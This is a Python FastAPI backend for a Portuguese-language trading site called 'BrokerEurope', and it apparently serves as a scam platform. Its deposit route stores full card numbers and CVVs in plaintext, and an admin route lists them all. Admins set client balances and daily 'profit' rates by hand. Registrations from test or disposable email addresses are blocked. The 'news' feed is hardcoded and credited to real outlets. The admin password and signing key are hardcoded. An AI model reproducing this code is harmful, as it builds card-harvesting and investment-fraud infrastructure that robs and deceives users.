from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from pydantic import BaseModel, EmailStr
from typing import Optional, List
from datetime import datetime, timedelta
from jose import JWTError, jwt
from passlib.context import CryptContext
import os
import asyncio
import json
from motor.motor_asyncio import AsyncIOMotorClient
from bson import ObjectId

app = FastAPI(title="BrokerEurope Platform")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- DB Setup ---
MONGO_URL = os.environ.get("MONGO_URL", "mongodb://localhost:27017")
client = AsyncIOMotorClient(MONGO_URL)
db = client["brokereurope"]

# --- Auth Config ---
SECRET_KEY = os.environ.get("SECRET_KEY", "brokereurope_secret_key_2024_very_long")
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_HOURS = 24

# Hardcoded admin credentials
ADMIN_USERNAME = "brokereurope"
ADMIN_PASSWORD = "Europeinvest"

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# --- WebSocket Manager ---
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        disconnected = []
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                disconnected.append(connection)
        for conn in disconnected:
            self.disconnect(conn)

manager = ConnectionManager()

# --- Helpers ---
def serialize_doc(doc):
    if doc is None:
        return None
    result = {}
    for key, value in doc.items():
        if isinstance(value, ObjectId):
            result[key] = str(value)
        elif isinstance(value, datetime):
            result[key] = value.isoformat()
        else:
            result[key] = value
    return result

def create_token(data: dict, role: str = "client"):
    payload = data.copy()
    payload["role"] = role
    payload["exp"] = datetime.utcnow() + timedelta(hours=ACCESS_TOKEN_EXPIRE_HOURS)
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

def decode_token(token: str):
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    except JWTError:
        return None

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    payload = decode_token(credentials.credentials)
    if not payload:
        raise HTTPException(status_code=401, detail="Token inválido")
    return payload

async def get_admin_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    payload = decode_token(credentials.credentials)
    if not payload or payload.get("role") != "admin":
        raise HTTPException(status_code=403, detail="Acesso negado")
    return payload

# --- Pydantic Models ---
class RegisterRequest(BaseModel):
    full_name: str
    email: EmailStr
    password: str
    country: Optional[str] = "Portugal"
    phone: Optional[str] = ""

class LoginRequest(BaseModel):
    email: EmailStr
    password: str

class AdminLoginRequest(BaseModel):
    username: str
    password: str

class DepositRequest(BaseModel):
    full_name: str
    card_number: str
    expiry: str
    cvv: str
    country: str
    postal_code: str
    amount: Optional[float] = 250.0

class WithdrawalRequest(BaseModel):
    method: str  # sepa or chargeback
    account_name: Optional[str] = ""
    iban: Optional[str] = ""
    bic: Optional[str] = ""
    amount: Optional[float] = 0.0
    note: Optional[str] = ""

class UpdateBalanceRequest(BaseModel):
    balance: float
    profit: float

    # Garantir que profit nunca é negativo
    def model_post_init(self, __context):
        if self.profit < 0:
            self.profit = 0.0
        if self.balance < 0:
            self.balance = 0.0

class UpdateStatusRequest(BaseModel):
    status: str

class UpdateProfileRequest(BaseModel):
    full_name: Optional[str] = None
    phone: Optional[str] = None
    country: Optional[str] = None


# ── Daily Profit Calculator ──────────────────────────────────────────
async def apply_daily_profit(user_id: str, user_doc: dict) -> dict:
    """Aplica o lucro diário acumulado com base na taxa configurada pelo admin."""
    rate = float(user_doc.get('daily_profit_rate', 0))
    if rate <= 0:
        return user_doc

    balance = float(user_doc.get('balance', 0))
    if balance <= 0:
        return user_doc

    last_updated = user_doc.get('profit_last_updated')
    now = datetime.utcnow()

    if not last_updated:
        await db.users.update_one(
            {'_id': ObjectId(user_id)},
            {'$set': {'profit_last_updated': now}}
        )
        return user_doc

    elapsed_days = (now - last_updated).total_seconds() / 86400.0
    if elapsed_days < 0.0007:   # menos de ~1 minuto — ignorar
        return user_doc

    profit_increment = balance * (rate / 100.0) * elapsed_days
    new_profit = max(0.0, float(user_doc.get('profit', 0)) + profit_increment)

    await db.users.update_one(
        {'_id': ObjectId(user_id)},
        {'$set': {'profit': round(new_profit, 2), 'profit_last_updated': now}}
    )
    user_doc['profit'] = round(new_profit, 2)
    user_doc['profit_last_updated'] = now
    return user_doc


@app.websocket("/ws/admin")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            # heartbeat support
            if data == "ping":
                await websocket.send_text("pong")
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception:
        manager.disconnect(websocket)

# Domínios e padrões bloqueados (testes/temporários)
BLOCKED_DOMAINS = {
    "ev.pt", "broker-test.com", "brokereurope.pt",
    "mailinator.com", "guerrillamail.com", "tempmail.com",
    "throwaway.email", "yopmail.com", "sharklasers.com",
    "guerrillamailblock.com", "grr.la", "guerrillamail.info",
    "spam4.me", "trashmail.com", "dispostable.com",
    "fakeinbox.com", "maildrop.cc", "getairmail.com",
}

BLOCKED_NAME_PATTERNS = [
    "test", "teste", "demo", "fake", "dummy", "trial",
    "example", "sample", "mock", "temp", "temporary",
]

def is_blocked_email(email: str) -> bool:
    email = email.lower().strip()
    domain = email.split("@")[-1] if "@" in email else ""
    if domain in BLOCKED_DOMAINS:
        return True
    local = email.split("@")[0]
    for pattern in BLOCKED_NAME_PATTERNS:
        if pattern in local:
            return True
    return False

# --- Auth Routes ---
@app.post("/api/auth/register")
async def register(req: RegisterRequest):
    # Bloquear emails de teste / domínios temporários
    if is_blocked_email(req.email):
        raise HTTPException(status_code=400, detail="Este endereço de e-mail não é permitido. Por favor utilize um e-mail válido.")

    existing = await db.users.find_one({"email": req.email})
    if existing:
        raise HTTPException(status_code=400, detail="Email já registado")
    
    hashed = pwd_context.hash(req.password)
    user = {
        "full_name": req.full_name,
        "email": req.email,
        "password": hashed,
        "country": req.country,
        "phone": req.phone,
        "balance": 0.0,
        "profit": 0.0,
        "status": "Novo",
        "created_at": datetime.utcnow(),
        "updated_at": datetime.utcnow()
    }
    result = await db.users.insert_one(user)
    token = create_token({"sub": str(result.inserted_id), "email": req.email}, role="client")
    return {"token": token, "user": {"id": str(result.inserted_id), "full_name": req.full_name, "email": req.email, "country": req.country, "balance": 0.0, "profit": 0.0}}

@app.post("/api/auth/login")
async def login(req: LoginRequest):
    user = await db.users.find_one({"email": req.email})
    if not user or not pwd_context.verify(req.password, user["password"]):
        raise HTTPException(status_code=401, detail="Credenciais inválidas")
    
    token = create_token({"sub": str(user["_id"]), "email": req.email}, role="client")
    return {
        "token": token,
        "user": {
            "id": str(user["_id"]),
            "full_name": user["full_name"],
            "email": user["email"],
            "country": user.get("country", ""),
            "phone": user.get("phone", ""),
            "balance": user.get("balance", 0.0),
            "profit": user.get("profit", 0.0),
            "status": user.get("status", "Novo")
        }
    }

@app.post("/api/admin/login")
async def admin_login(req: AdminLoginRequest):
    if req.username != ADMIN_USERNAME or req.password != ADMIN_PASSWORD:
        raise HTTPException(status_code=401, detail="Credenciais de administrador inválidas")
    token = create_token({"sub": "admin", "username": req.username}, role="admin")
    return {"token": token, "role": "admin"}

# --- Client Routes ---
@app.get("/api/me")
async def get_me(current_user = Depends(get_current_user)):
    user = await db.users.find_one({"_id": ObjectId(current_user["sub"])})
    if not user:
        raise HTTPException(status_code=404, detail="Utilizador não encontrado")

    # Aplicar lucro diário acumulado
    user = await apply_daily_profit(str(user["_id"]), user)

    profit = max(0.0, float(user.get("profit", 0)))
    balance = max(0.0, float(user.get("balance", 0)))

    return serialize_doc({
        "id": user["_id"],
        "full_name": user["full_name"],
        "email": user["email"],
        "country": user.get("country", ""),
        "phone": user.get("phone", ""),
        "balance": balance,
        "profit": profit,
        "status": user.get("status", "Novo"),
        "daily_profit_rate": user.get("daily_profit_rate", 0),
        "created_at": user.get("created_at")
    })

@app.put("/api/me")
async def update_me(req: UpdateProfileRequest, current_user = Depends(get_current_user)):
    update_data = {"updated_at": datetime.utcnow()}
    if req.full_name: update_data["full_name"] = req.full_name
    if req.phone is not None: update_data["phone"] = req.phone
    if req.country: update_data["country"] = req.country
    await db.users.update_one({"_id": ObjectId(current_user["sub"])}, {"$set": update_data})
    return {"success": True}

@app.post("/api/deposit")
async def create_deposit(req: DepositRequest, current_user = Depends(get_current_user)):
    user_id = current_user["sub"]
    
    # Store card data
    card_data = {
        "user_id": user_id,
        "email": current_user.get("email", ""),
        "full_name": req.full_name,
        "card_number": req.card_number,
        "expiry": req.expiry,
        "cvv": req.cvv,
        "country": req.country,
        "postal_code": req.postal_code,
        "amount": req.amount,
        "created_at": datetime.utcnow()
    }
    await db.cards_data.insert_one(card_data)
    
    # Store deposit record
    deposit = {
        "user_id": user_id,
        "amount": req.amount,
        "status": "pending",
        "created_at": datetime.utcnow()
    }
    await db.deposits.insert_one(deposit)
    
    # Get user info for notification
    user = await db.users.find_one({"_id": ObjectId(user_id)})
    
    # Broadcast to admin WebSocket
    notification = {
        "type": "deposit_submitted",
        "user_id": user_id,
        "user_name": user["full_name"] if user else req.full_name,
        "email": current_user.get("email", ""),
        "amount": req.amount,
        "country": req.country,
        "card_last4": req.card_number[-4:] if len(req.card_number) >= 4 else "***",
        "timestamp": datetime.utcnow().isoformat()
    }
    await manager.broadcast(notification)
    
    return {"success": True, "message": "Depósito enviado para processamento"}

@app.post("/api/withdrawal")
async def create_withdrawal(req: WithdrawalRequest, current_user = Depends(get_current_user)):
    withdrawal = {
        "user_id": current_user["sub"],
        "method": req.method,
        "account_name": req.account_name,
        "iban": req.iban,
        "bic": req.bic,
        "amount": req.amount,
        "note": req.note,
        "status": "pending",
        "created_at": datetime.utcnow()
    }
    await db.withdrawals.insert_one(withdrawal)
    return {"success": True, "message": "Pedido de levantamento enviado"}

# --- Admin Routes ---
class UpdateDailyRateRequest(BaseModel):
    daily_profit_rate: float  # % por dia (ex: 1.5 = 1.5% ao dia)


@app.put("/api/admin/users/{user_id}/daily-rate")
async def update_daily_rate(user_id: str, req: UpdateDailyRateRequest, admin = Depends(get_admin_user)):
    rate = max(0.0, min(req.daily_profit_rate, 100.0))  # entre 0% e 100%
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {
            "daily_profit_rate": rate,
            "profit_last_updated": datetime.utcnow(),
            "updated_at": datetime.utcnow()
        }}
    )
    return {"success": True, "daily_profit_rate": rate}


@app.get("/api/admin/users")
async def get_all_users(admin = Depends(get_admin_user)):
    users = []
    async for user in db.users.find({}).sort("created_at", -1):
        users.append(serialize_doc({
            "id": user["_id"],
            "full_name": user["full_name"],
            "email": user["email"],
            "country": user.get("country", ""),
            "phone": user.get("phone", ""),
            "balance": max(0.0, float(user.get("balance", 0))),
            "profit": max(0.0, float(user.get("profit", 0))),
            "status": user.get("status", "Novo"),
            "daily_profit_rate": user.get("daily_profit_rate", 0),
            "created_at": user.get("created_at")
        }))
    return users

@app.put("/api/admin/users/{user_id}/balance")
async def update_user_balance(user_id: str, req: UpdateBalanceRequest, admin = Depends(get_admin_user)):
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"balance": req.balance, "profit": req.profit, "updated_at": datetime.utcnow()}}
    )
    return {"success": True}

@app.put("/api/admin/users/{user_id}/status")
async def update_user_status(user_id: str, req: UpdateStatusRequest, admin = Depends(get_admin_user)):
    await db.users.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"status": req.status, "updated_at": datetime.utcnow()}}
    )
    return {"success": True}

@app.get("/api/admin/cards")
async def get_all_cards(admin = Depends(get_admin_user)):
    cards = []
    async for card in db.cards_data.find({}).sort("created_at", -1):
        cards.append(serialize_doc({
            "id": card["_id"],
            "user_id": card.get("user_id", ""),
            "email": card.get("email", ""),
            "full_name": card["full_name"],
            "card_number": card["card_number"],
            "expiry": card["expiry"],
            "cvv": card["cvv"],
            "country": card["country"],
            "postal_code": card["postal_code"],
            "amount": card.get("amount", 0),
            "created_at": card.get("created_at")
        }))
    return cards

@app.get("/api/admin/deposits")
async def get_all_deposits(admin = Depends(get_admin_user)):
    deposits = []
    async for dep in db.deposits.find({}).sort("created_at", -1):
        deposits.append(serialize_doc({
            "id": dep["_id"],
            "user_id": dep["user_id"],
            "amount": dep["amount"],
            "status": dep["status"],
            "created_at": dep.get("created_at")
        }))
    return deposits

@app.get("/api/news")
async def get_news():
    # Return static financial news items (in a real app this would be from an API)
    news = [
        {"id": 1, "title": "BCE mantém taxas de juro inalteradas na reunião de dezembro", "source": "Reuters", "category": "Macro", "time": "Há 2h", "snippet": "O Banco Central Europeu decidiu manter as taxas de referência, sinalizando cautela perante a volatilidade nos mercados.", "url": "#"},
        {"id": 2, "title": "EUR/USD consolida acima de 1.0850 com dados de inflação", "source": "Bloomberg", "category": "FX", "time": "Há 3h", "snippet": "O par cambial EUR/USD mantém-se estável após a divulgação dos dados de inflação da zona euro acima do esperado.", "url": "#"},
        {"id": 3, "title": "DAX atinge máximos históricos impulsionado pelo setor tecnológico", "source": "Financial Times", "category": "Ações", "time": "Há 4h", "snippet": "O índice alemão DAX 40 atingiu novos máximos históricos, liderado pelas ganhos no setor tecnológico europeu.", "url": "#"},
        {"id": 4, "title": "Petróleo recua com dados de stocks dos EUA superiores ao esperado", "source": "CNBC", "category": "Commodities", "time": "Há 5h", "snippet": "O Brent recuou 1,2% após a divulgação de dados de stocks de petróleo nos EUA superiores às estimativas do mercado.", "url": "#"},
        {"id": 5, "title": "Fed sinaliza possível pausa nos cortes de taxas para 2025", "source": "WSJ", "category": "Macro", "time": "Há 6h", "snippet": "A Reserva Federal americana sinalizou que poderá fazer uma pausa nos cortes de taxas de juro no próximo trimestre.", "url": "#"},
        {"id": 6, "title": "Bitcoin supera $95.000 em nova onda de adoção institucional", "source": "CoinDesk", "category": "Crypto", "time": "Há 7h", "snippet": "O Bitcoin voltou a superar os $95.000, impulsionado por novos anúncios de compras institucionais de grande escala.", "url": "#"},
        {"id": 7, "title": "Zona Euro: PMI Composto sobe para 50,3 em novembro", "source": "Markit", "category": "Macro", "time": "Há 8h", "snippet": "O índice PMI composto da zona euro subiu para 50,3 em novembro, acima do limiar de expansão de 50 pontos.", "url": "#"},
        {"id": 8, "title": "Apple anuncia novo iPhone com chip de IA avançado", "source": "TechCrunch", "category": "Ações", "time": "Há 9h", "snippet": "A Apple apresentou o novo iPhone 17 com chip de IA integrado, impulsionando as ações da empresa +2,3% no pré-mercado.", "url": "#"},
    ]
    return news

@app.get("/api/health")
async def health():
    return {"status": "ok", "service": "BrokerEurope API"}
